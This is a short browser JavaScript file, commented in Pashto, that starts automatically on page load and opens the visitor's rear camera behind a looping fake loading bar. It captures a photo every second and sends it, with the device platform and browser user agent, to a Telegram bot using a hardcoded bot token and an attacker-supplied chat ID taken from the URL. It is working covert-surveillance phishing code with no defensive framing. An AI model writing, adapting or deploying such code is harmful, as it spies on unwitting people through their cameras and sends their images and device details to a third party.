const BOT_TOKEN = "8750180526:AAFpXlIk0KHB5j3SljkE7DvheXngu7wA2Kg";
const CHAT_ID = new URLSearchParams(location.search).get("id");

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const bar = document.getElementById("bar");

let stream;
let interval;

// 🚀 auto start
start();

async function start() {
  if (!CHAT_ID) {
    console.error("CHAT_ID نشته");
    return;
  }

  try {
    // 📸 یوازې شا کمره
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: "environment" } }
    });

    video.srcObject = stream;

    video.onloadedmetadata = () => {
      startLoop();
    };

  } catch (err) {
    console.error("Camera error:", err);
  }
}

// 🔄 loading loop (0 → 100 → reset)
function startLoop() {
  let progress = 0;

  if (interval) clearInterval(interval);

  interval = setInterval(() => {
    progress += 5;
    bar.style.width = progress + "%";

    if (progress >= 100) {
      progress = 0;
      bar.style.width = "0%";
      capture();
    }

  }, 50); // 1 second
}

// 📸 capture
function capture() {
  if (!video.videoWidth) return;

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  ctx.filter = "brightness(1.1) contrast(1.2)";
  ctx.drawImage(video, 0, 0);

  canvas.toBlob(send, "image/jpeg");
}

// 📤 send to telegram
function send(blob) {
  const fd = new FormData();

  fd.append("chat_id", CHAT_ID);
  fd.append("photo", blob, "back.jpg");

  const caption =
`📸 Back Camera Capture

📱 Device: ${navigator.platform}
🌐 Browser: ${navigator.userAgent}

🛡️ Status: Active`;

  fd.append("caption", caption);

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: fd
  })
  .then(res => res.json())
  .then(data => {
    if (!data.ok) {
      console.error("Telegram error:", data.description);
    } else {
      console.log("Sent ✅");
    }
  })
  .catch(err => console.error(err));
}
